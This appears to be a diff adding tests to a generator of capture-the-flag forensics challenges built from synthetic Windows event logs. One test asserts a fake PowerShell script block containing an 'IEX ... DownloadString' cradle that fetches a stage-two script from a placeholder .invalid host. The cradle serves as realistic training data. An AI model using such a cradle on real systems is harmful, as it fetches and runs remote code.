@@ -6,13 +6,21 @@ import base64
 import datetime
 import io
 import json
+import re
 import zipfile
+from pathlib import Path
 
-from poligon.core.generate import generate_template_e
+from poligon.core import history
+from poligon.core.flag import load_solution
+from poligon.core.generate import generate, generate_template_e
 from poligon.core.templates.template_e import (
     CHALLENGE_TXT,
+    CHANNELS,
+    DIFFICULTY_EVENT_IDS,
     EVENTS_NAME,
+    MIN_EVENT_COUNT,
     TemplateEConfig,
+    build_challenge,
 )
 
 FLAG = "FLAG{d3ad_b33f_cafe}"
@@ -127,3 +135,89 @@ def test_template_e_timestamps_iso():
         stamp = event["Event"]["System"]["TimeCreated"]
         assert stamp.endswith("Z")
         datetime.datetime.fromisoformat(stamp.replace("Z", "+00:00"))
+
+
+# --- mutation sweep ---------------------------------------------------------
+
+UUID = r"[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}"
+CMD = "C:\\Windows\\System32\\cmd.exe"
+
+
+def _flag_data(event_id):
+    [event] = _flag_events(_events(event_id))
+    assert event["Event"]["System"]["EventID"] == event_id
+    return event["Event"]["EventData"]
+
+
+def test_template_e_difficulty_selects_event_id(tmp_path, monkeypatch):
+    monkeypatch.setattr(history, "HISTORY_PATH",
+                        tmp_path / "home" / ".poligon" / "history.json")
+    for difficulty, allowed in DIFFICULTY_EVENT_IDS.items():
+        for seed in range(4):
+            result = generate("evtx", difficulty, seed,
+                              output_dir=tmp_path / "out")
+            flag = load_solution(Path(result["scenario_dir"]))["flag"]
+            needles = (base64.b64encode(flag.encode()).decode(),
+                       flag.encode().hex())
+            with zipfile.ZipFile(result["zip_path"]) as zf:
+                [name] = [n for n in zf.namelist()
+                          if n.endswith("/" + EVENTS_NAME)]
+                events = json.loads(zf.read(name))
+            [event] = [e for e in events
+                       if any(n in json.dumps(e) for n in needles)]
+            assert event["Event"]["System"]["EventID"] in allowed
+
+
+def test_template_e_flag_value_formats():
+    script = _flag_data(4104)["ScriptBlockText"]
+    assert script.startswith(f"$key = '{FLAG_B64}'\nIEX (New-Object "
+                             "Net.WebClient).DownloadString('http://")
+    assert script.endswith(".invalid/stage2.ps1')")
+    assert _flag_data(4624)["TargetUserName"] == FLAG_B64
+    assert _flag_data(4720)["SamAccountName"] == FLAG_B64
+    sysmon = _flag_data(1)
+    assert sysmon["Image"] == CMD
+    assert sysmon["CommandLine"] == (f"cmd.exe /c echo {FLAG_B64} > "
+                                     "C:\\Users\\Public\\note.txt")
+
+
+def test_template_e_system_block():
+    # Chainsaw-style System block: exact keys, channel per EventID, one
+    # computer, record ids consecutive in time order.
+    for event_id in (4104, 4624, 1):
+        systems = [e["Event"]["System"] for e in _events(event_id)]
+        for system in systems:
+            assert set(system) == {"EventID", "TimeCreated", "Computer",
+                                   "Channel", "EventRecordID"}
+            assert system["Channel"] == CHANNELS[system["EventID"]]
+        assert len({s["Computer"] for s in systems}) == 1
+        assert re.fullmatch(r"DESKTOP-[A-Z0-9]{5}", systems[0]["Computer"])
+        ids = [s["EventRecordID"] for s in systems]
+        assert ids == list(range(ids[0], ids[0] + len(ids)))
+        times = [s["TimeCreated"] for s in systems]
+        assert times == sorted(times)
+
+
+def test_template_e_times_fixed_window():
+    # Fixed 2025 window, never the wall clock.
+    for seed in range(5):
+        data = generate_template_e(TemplateEConfig(flag=FLAG, seed=seed))
+        events = json.loads(_member(data, EVENTS_NAME))
+        assert all(e["Event"]["System"]["TimeCreated"].startswith("2025-")
+                   for e in events)
+        with zipfile.ZipFile(io.BytesIO(data)) as zf:
+            assert {i.date_time[0] for i in zf.infolist()} == {2025}
+
+
+def test_template_e_minimum_event_count_accepted():
+    assert len(_events(event_count=MIN_EVENT_COUNT)) == MIN_EVENT_COUNT
+
+
+def test_template_e_zip_naming():
+    name, data = build_challenge(TemplateEConfig(flag=FLAG))
+    assert re.fullmatch(f"poligon_template_e_({UUID})\\.zip", name)
+    challenge_id = name[len("poligon_template_e_"):-len(".zip")]
+    with zipfile.ZipFile(io.BytesIO(data)) as zf:
+        assert sorted(zf.namelist()) == sorted(
+            f"challenge_{challenge_id}/{n}" for n in (EVENTS_NAME,
+                                                      CHALLENGE_TXT))
